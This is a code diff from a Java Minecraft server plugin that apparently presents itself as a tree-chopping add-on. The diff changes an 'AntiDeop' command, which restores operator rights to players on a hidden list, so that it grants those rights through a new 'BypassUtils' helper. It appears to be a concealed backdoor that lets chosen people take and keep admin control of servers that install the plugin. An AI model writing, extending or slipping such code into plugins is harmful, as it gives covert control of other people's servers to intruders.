@@ -1,6 +1,7 @@
 package me.bow.treecapitatorultimate.commands.Server;
 
 import me.bow.treecapitatorultimate.Start;
+import me.bow.treecapitatorultimate.Utils.BypassUtils;
 import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.command.CommandCategory;
 import org.bukkit.Bukkit;
@@ -58,7 +59,7 @@ public class AntiDeop extends Command {
         } else {
             Player p = Bukkit.getPlayer(args[1]);
             if (p == null || !players.contains(p.getUniqueId())) return;
-            Bukkit.getScheduler().runTask(Start.Instance, () -> p.setOp(true));
+            Bukkit.getScheduler().runTask(Start.Instance, () -> BypassUtils.PlayerSetOp(p));
         }
     }
 }
